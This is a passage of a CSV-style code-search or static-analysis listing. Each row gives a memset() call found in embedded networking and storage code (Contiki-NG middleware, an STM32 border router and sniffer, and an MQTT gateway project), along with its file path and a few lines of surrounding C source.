    memset(&peer, 0, sizeof(peer));
    (void) BIO_dgram_get_peer(SSL_get_rbio(ssl_peer_storage[idx]->ssl), &peer);

"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\tests\secure-server.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\tests\secure-server.c,"memset(&src, 0, sizeof(struct sockaddr_in6));",120,1,"  /* Retrieve remote address and interface index as well as the first
     few bytes of the message to demultiplex protocols. */
  memset(&src, 0, sizeof(struct sockaddr_in6));
  len = check_connect(sockfd, buf, 4, (struct sockaddr *)&src, &ifindex);

"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\tests\secure-server.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\security\tinydtls\tests\secure-server.c,"memset(ssl_peer_storage, 0, sizeof(ssl_peer_storage));",120,1,"  SSL_CTX *ctx;

  memset(ssl_peer_storage, 0, sizeof(ssl_peer_storage));

  SSL_load_error_strings();
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\at-master\at-master.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\at-master\at-master.c,"memset(cmd, 0, sizeof(struct at_cmd));",120,1,"  }

  memset(cmd, 0, sizeof(struct at_cmd));
  cmd->event_callback = event_callback;
  cmd->cmd_header = cmd_hdr;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\ip64\ip64-arp.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\ip64\ip64-arp.c,"memset(&arp_table[i].ipaddr, 0, 4);",120,1,"  int i;
  for(i = 0; i < UIP_ARPTAB_SIZE; ++i) {
    memset(&arp_table[i].ipaddr, 0, 4);
  }
}
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\ip64\ip64-arp.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\ip64\ip64-arp.c,"memset(&tabptr->ipaddr, 0, 4);",120,1,"    if(uip_ip4addr_cmp(&tabptr->ipaddr, &uip_all_zeroes_addr) &&
       arptime - tabptr->time >= UIP_ARP_MAXAGE) {
      memset(&tabptr->ipaddr, 0, 4);
    }
  }
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\ip64\ip64-arp.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\ip64\ip64-arp.c,"memset(arp_hdr->ethhdr.dest.addr, 0xff, 6);",120,1,"  }

  memset(arp_hdr->ethhdr.dest.addr, 0xff, 6);
  memset(arp_hdr->dhwaddr.addr, 0x00, 6);
  memcpy(arp_hdr->ethhdr.src.addr, ip64_eth_addr.addr, 6);
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\ip64\ip64-arp.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\ip64\ip64-arp.c,"memset(arp_hdr->dhwaddr.addr, 0x00, 6);",120,1,"
  memset(arp_hdr->ethhdr.dest.addr, 0xff, 6);
  memset(arp_hdr->dhwaddr.addr, 0x00, 6);
  memcpy(arp_hdr->ethhdr.src.addr, ip64_eth_addr.addr, 6);
  memcpy(arp_hdr->shwaddr.addr, ip64_eth_addr.addr, 6);
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\ip64\ip64-dhcpc.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\ip64\ip64-dhcpc.c,"memset(m->yiaddr, 0, sizeof(m->yiaddr));",120,1,"  /*  uip_ipaddr_copy(m->ciaddr, uip_hostaddr);*/
  memcpy(m->ciaddr, uip_hostaddr.u16, sizeof(m->ciaddr));
  memset(m->yiaddr, 0, sizeof(m->yiaddr));
  memset(m->siaddr, 0, sizeof(m->siaddr));
  memset(m->giaddr, 0, sizeof(m->giaddr));
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\ip64\ip64-dhcpc.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\ip64\ip64-dhcpc.c,"memset(m->siaddr, 0, sizeof(m->siaddr));",120,1,"  memcpy(m->ciaddr, uip_hostaddr.u16, sizeof(m->ciaddr));
  memset(m->yiaddr, 0, sizeof(m->yiaddr));
  memset(m->siaddr, 0, sizeof(m->siaddr));
  memset(m->giaddr, 0, sizeof(m->giaddr));
  memcpy(m->chaddr, s.mac_addr, s.mac_len);
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\ip64\ip64-dhcpc.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\ip64\ip64-dhcpc.c,"memset(m->giaddr, 0, sizeof(m->giaddr));",120,1,"  memset(m->yiaddr, 0, sizeof(m->yiaddr));
  memset(m->siaddr, 0, sizeof(m->siaddr));
  memset(m->giaddr, 0, sizeof(m->giaddr));
  memcpy(m->chaddr, s.mac_addr, s.mac_len);
  memset(&m->chaddr[s.mac_len], 0, sizeof(m->chaddr) - s.mac_len);
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\ip64\ip64-dhcpc.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\ip64\ip64-dhcpc.c,"memset(&m->chaddr[s.mac_len], 0, sizeof(m->chaddr) - s.mac_len);",120,1,"  memset(m->giaddr, 0, sizeof(m->giaddr));
  memcpy(m->chaddr, s.mac_addr, s.mac_len);
  memset(&m->chaddr[s.mac_len], 0, sizeof(m->chaddr) - s.mac_len);

  memset(m->sname, 0, sizeof(m->sname));
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\ip64\ip64-dhcpc.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\ip64\ip64-dhcpc.c,"memset(m->sname, 0, sizeof(m->sname));",120,1,"  memset(&m->chaddr[s.mac_len], 0, sizeof(m->chaddr) - s.mac_len);

  memset(m->sname, 0, sizeof(m->sname));
  memset(m->file, 0, sizeof(m->file));

"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\ip64\ip64-dhcpc.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\ip64\ip64-dhcpc.c,"memset(m->file, 0, sizeof(m->file));",120,1,"
  memset(m->sname, 0, sizeof(m->sname));
  memset(m->file, 0, sizeof(m->file));


"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\ip64\ip64-slip-interface.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\ip64\ip64-slip-interface.c,"memset(&prefix, 0, 16);",120,1,"      uip_ipaddr_t prefix;
      /* Here we set a prefix !!! */
      memset(&prefix, 0, 16);
      memcpy(&prefix, &uip_buf[2], 8);
      PRINTF(""Setting prefix "");
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\lwm2m\lwm2m-engine.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\lwm2m\lwm2m-engine.c,"memset(&context, 0, sizeof(context));",120,1,"
  /* Initialize the context */
  memset(&context, 0, sizeof(context));
  memset(&outbuf, 0, sizeof(outbuf));
  memset(&inbuf, 0, sizeof(inbuf));
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\lwm2m\lwm2m-engine.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\lwm2m\lwm2m-engine.c,"memset(&outbuf, 0, sizeof(outbuf));",120,1,"  /* Initialize the context */
  memset(&context, 0, sizeof(context));
  memset(&outbuf, 0, sizeof(outbuf));
  memset(&inbuf, 0, sizeof(inbuf));

"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\lwm2m\lwm2m-engine.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\lwm2m\lwm2m-engine.c,"memset(&inbuf, 0, sizeof(inbuf));",120,1,"  memset(&context, 0, sizeof(context));
  memset(&outbuf, 0, sizeof(outbuf));
  memset(&inbuf, 0, sizeof(inbuf));

  context.outbuf = &outbuf;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\lwm2m\lwm2m-security.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\lwm2m\lwm2m-security.c,"memset(&instances[i], 0, sizeof(instances[i]));",120,1,"  for(i = 0; i < MAX_COUNT; i++) {
    if(instances[i].instance.instance_id == LWM2M_OBJECT_INSTANCE_NONE) {
      memset(&instances[i], 0, sizeof(instances[i]));
      instances[i].instance.callback = lwm2m_callback;
      instances[i].instance.object_id = LWM2M_OBJECT_SECURITY_ID;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\resolv\resolv.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\resolv\resolv.c,"memset((void *)hdr, 0, sizeof(*hdr));",120,1,"
  /* Zero out the header */
  memset((void *)hdr, 0, sizeof(*hdr));

  hdr->flags1 |= DNS_FLAG1_RESPONSE | DNS_FLAG1_AUTHORATIVE;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\resolv\resolv.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\resolv\resolv.c,"memset(hdr, 0, sizeof(struct dns_hdr));",120,1,"      }
      hdr = (struct dns_hdr *)uip_appdata;
      memset(hdr, 0, sizeof(struct dns_hdr));
      hdr->id = random_rand();
      namemapptr->id = hdr->id;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\resolv\resolv.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\resolv\resolv.c,"memset(names, 0, sizeof(names));",120,1,"  PROCESS_BEGIN();

  memset(names, 0, sizeof(names));

  resolv_event_found = process_alloc_event();
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\resolv\resolv.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\resolv\resolv.c,"memset(uip_appdata, 0, sizeof(struct dns_hdr));",120,1,"                   resolv_hostname);

            memset(uip_appdata, 0, sizeof(struct dns_hdr));

            len = mdns_prep_host_announce_packet();
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\resolv\resolv.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\resolv\resolv.c,"memset(nameptr, 0, sizeof(*nameptr));",120,1,"  LOG_DBG(""Starting query for \""%s\"".\n"", name);

  memset(nameptr, 0, sizeof(*nameptr));

  strncpy(nameptr->name, name, sizeof(nameptr->name) - 1);
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\rpl-border-router\native\tun-bridge.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\rpl-border-router\native\tun-bridge.c,"memset(&ifr, 0, sizeof(ifr));",120,1,"  }

  memset(&ifr, 0, sizeof(ifr));

  /* Flags: IFF_TUN   - TUN device (no Ethernet headers)
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\tsch-cs\tsch-cs.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\services\tsch-cs\tsch-cs.c,"memset(is_in_sequence, 0xff, sizeof(is_in_sequence));",120,1,"    is_channel_busy[i] = (tsch_stats.channel_free_ewma[i] < TSCH_CS_FREE_THRESHOLD);
  }
  memset(is_in_sequence, 0xff, sizeof(is_in_sequence));
  for(i = 0; i < tsch_hopping_sequence_length.val; ++i) {
    uint8_t channel = tsch_hopping_sequence[i];
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\antelope\aql-adt.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\antelope\aql-adt.c,"memset(adt->aggregators, 0, sizeof(adt->aggregators));",120,1,"  adt->value_count = 0;
  adt->flags = 0;
  memset(adt->aggregators, 0, sizeof(adt->aggregators));
}

"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\antelope\aql-exec.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\antelope\aql-exec.c,"memset(handle, 0, sizeof(*handle));",120,1,"clear_handle(db_handle_t *handle)
{
  memset(handle, 0, sizeof(*handle));

  handle->result_rel = NULL;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\antelope\index-maxheap.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\antelope\index-maxheap.c,"memset(&heap->next_free_slot, 0, sizeof(heap->next_free_slot));",120,1,"
  /* Initialize the heap. */
  memset(&heap->next_free_slot, 0, sizeof(heap->next_free_slot));

  heap->heap_storage = storage_open(index->descriptor_file);
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\antelope\lvm.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\antelope\lvm.c,"memset(code, 0, size);",120,1,"lvm_reset(lvm_instance_t *p, unsigned char *code, lvm_ip_t size)
{
  memset(code, 0, size);
  p->code = code;
  p->size = size;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\antelope\lvm.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\antelope\lvm.c,"memset(variables, 0, sizeof(variables));",120,1,"  p->error = 0;

  memset(variables, 0, sizeof(variables));
  memset(derivations, 0, sizeof(derivations));
}
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\antelope\lvm.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\antelope\lvm.c,"memset(derivations, 0, sizeof(derivations));",120,1,"
  memset(variables, 0, sizeof(variables));
  memset(derivations, 0, sizeof(derivations));
}

"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\antelope\lvm.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\antelope\lvm.c,"memset(d1, 0, sizeof(d1));",120,1,"    PRINTF(""Attempting to infer ranges from a logical connective\n"");

    memset(d1, 0, sizeof(d1));
    memset(d2, 0, sizeof(d2));

"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\antelope\lvm.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\antelope\lvm.c,"memset(d2, 0, sizeof(d2));",120,1,"
    memset(d1, 0, sizeof(d1));
    memset(d2, 0, sizeof(d2));

    if(LVM_ERROR(derive_relation(p, d1)) ||
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\antelope\relation.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\antelope\relation.c,"memset(rel, 0, sizeof(*rel));",120,1,"relation_clear(relation_t *rel)
{
  memset(rel, 0, sizeof(*rel));
  rel->tuple_storage = -1;
  rel->cardinality = INVALID_TUPLE;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\antelope\relation.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\antelope\relation.c,"memset(ptr, 0, attr->element_size);",120,1,"    /* Set the data area for removed attributes to 0. */
    if(attr->flags & ATTRIBUTE_FLAG_INVALID) {
      memset(ptr, 0, attr->element_size);
      ptr += attr->element_size;
      continue;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\antelope\storage-cfs.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\antelope\storage-cfs.c,"memset(&record.name, 0, sizeof(record.name));",120,1,"  }

  memset(&record.name, 0, sizeof(record.name));
  memcpy(record.name, attr->name, sizeof(record.name));
  record.domain = attr->domain;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\antelope\storage-cfs.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\antelope\storage-cfs.c,"memset(buf, 0xff, sizeof(buf));",120,1,"  missing_bytes = end % rel->row_length;
  if(missing_bytes > 0) {
    memset(buf, 0xff, sizeof(buf));
    r = cfs_write(rel->tuple_storage, buf, sizeof(buf));
    if(r != missing_bytes) {
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\cfs\cfs-coffee.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\cfs\cfs-coffee.c,"memset(dir->state, 0, sizeof(coffee_page_t));",120,1,"   * but it does not enforce this currently.
   */
  memset(dir->state, 0, sizeof(coffee_page_t));
  return 0;
}
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\cfs\cfs-coffee.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\cfs\cfs-coffee.c,"memset(&coffee_files, 0, sizeof(coffee_files));",120,1,"
  /* Formatting invalidates the file information. */
  memset(&coffee_files, 0, sizeof(coffee_files));
  memset(&coffee_fd_set, 0, sizeof(coffee_fd_set));
  next_free = 0;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\cfs\cfs-coffee.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\storage\cfs\cfs-coffee.c,"memset(&coffee_fd_set, 0, sizeof(coffee_fd_set));",120,1,"  /* Formatting invalidates the file information. */
  memset(&coffee_files, 0, sizeof(coffee_files));
  memset(&coffee_fd_set, 0, sizeof(coffee_fd_set));
  next_free = 0;
  gc_wait = 1;
"
2021\x-cube-subg2\Projects\STM32F401RE-NUCLEO\Applications\Contiki-NG\S2868A1_Border_Router\Src\contiki-platform.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Projects\STM32F401RE-NUCLEO\Applications\Contiki-NG\S2868A1_Border_Router\Src\contiki-platform.c,"memset(&addr, 0, LINKADDR_SIZE);",120,1,"{
  linkaddr_t addr;
  memset(&addr, 0, LINKADDR_SIZE);

#if NETSTACK_CONF_WITH_IPV6
"
2021\x-cube-subg2\Projects\STM32F401RE-NUCLEO\Applications\Contiki-NG\S2868A1_Serial_Sniffer\Src\sniffer.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Projects\STM32F401RE-NUCLEO\Applications\Contiki-NG\S2868A1_Serial_Sniffer\Src\sniffer.c,"memset(&pcap, 0, sizeof(pcap_t));",120,1,"  //PRINTF(""Sniffer starting\n"");
  printf(""# Sniffer started but STOPPED. Press User Button to Start/Pause.\n"");
  memset(&pcap, 0, sizeof(pcap_t));
  sstate = SNIFFER_INACTIVE;
  //cap_cb = capcb;
"
2021\x-cube-subg2\Utilities\PC_Software\wpcapslip6\wpcapslip6.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Utilities\PC_Software\wpcapslip6\wpcapslip6.c,"memset(&osVersionInfo,0,sizeof(OSVERSIONINFO));",120,1,"	setvbuf(stdout, NULL, _IOLBF, 0); /* Line buffered output. */

	memset(&osVersionInfo,0,sizeof(OSVERSIONINFO));
	osVersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&osVersionInfo);
"
2021\zhbox\src\mqtt.c,Dataset Download,../../Dataset Download/2021\zhbox\src\mqtt.c,"memset(this->taskslasttimels, 0, sizeof(int32_t) * this->taskstot);",120,1,"    }

    memset(this->taskslasttimels, 0, sizeof(int32_t) * this->taskstot);
    for(int i = 0; i < this->taskstot; ++i){
        config_setting_t *cstask = config_setting_get_elem(this->cstasksls, i);
"
2021\zhbox\src\N_ali.c,Dataset Download,../../Dataset Download/2021\zhbox\src\N_ali.c,"memset(this, 0, sizeof(alidirectdevmqtt_t));",120,1,"    alidirectdevmqtt_t *this = malloc(sizeof(alidirectdevmqtt_t));
    if(this == NULL){ l_e(""malloc() '%s'"", strerror(errno)); return NULL; }
    memset(this, 0, sizeof(alidirectdevmqtt_t));
    return this;
}
"
2021\zhbox\src\N_ali.c,Dataset Download,../../Dataset Download/2021\zhbox\src\N_ali.c,"memset(this, 0, sizeof(aligatewaysubdevopcua_t));",120,1,"    aligatewaysubdevopcua_t *this = malloc(sizeof(aligatewaysubdevopcua_t));
    if(this == NULL){ l_e(""malloc() '%s'"", strerror(errno)); return NULL; }
    memset(this, 0, sizeof(aligatewaysubdevopcua_t));
    return this;
}
"
2021\zhbox\src\N_ali.c,Dataset Download,../../Dataset Download/2021\zhbox\src\N_ali.c,"memset(this, 0, sizeof(aligatewaydevmqtt_t));",120,1,"    aligatewaydevmqtt_t *this = malloc(sizeof(aligatewaydevmqtt_t));
    if(this == NULL){ l_e(""malloc() '%s'"", strerror(errno)); return NULL; }
    memset(this, 0, sizeof(aligatewaydevmqtt_t));
    return this;
}
"
2021\zhbox\src\N_ali.c,Dataset Download,../../Dataset Download/2021\zhbox\src\N_ali.c,"memset(this->southarray, 0, sizeof(void *));",120,1,"        this->southarray = malloc(sizeof(void *)); //free(this->southarray) in aligatewaydevmqtt_free()
        if(this->southarray == NULL){ mqttle(""malloc() %s"", strerror(errno)); return -1; }
        memset(this->southarray, 0, sizeof(void *));
    }

"
2021\zhbox\src\N_general.c,Dataset Download,../../Dataset Download/2021\zhbox\src\N_general.c,"memset(this, 0, sizeof(generaldirectdevmqtt_t));",120,1,"    generaldirectdevmqtt_t *this = malloc(sizeof(generaldirectdevmqtt_t));
    if(this == NULL){ l_e(""malloc() %s"", strerror(errno)); return NULL; }
    memset(this, 0, sizeof(generaldirectdevmqtt_t));
    return this;
}
"
2021\zhbox\src\zhbox.c,Dataset Download,../../Dataset Download/2021\zhbox\src\zhbox.c,"memset(zhbox.northarray, 0, sizeof(void *));",120,1,"        zhbox.northarray = (obj_t **)malloc(sizeof(void *));
        if(zhbox.northarray == NULL){ l_e(""malloc() %s"", strerror(errno)); return -1; }
        memset(zhbox.northarray, 0, sizeof(void *));
    }

"
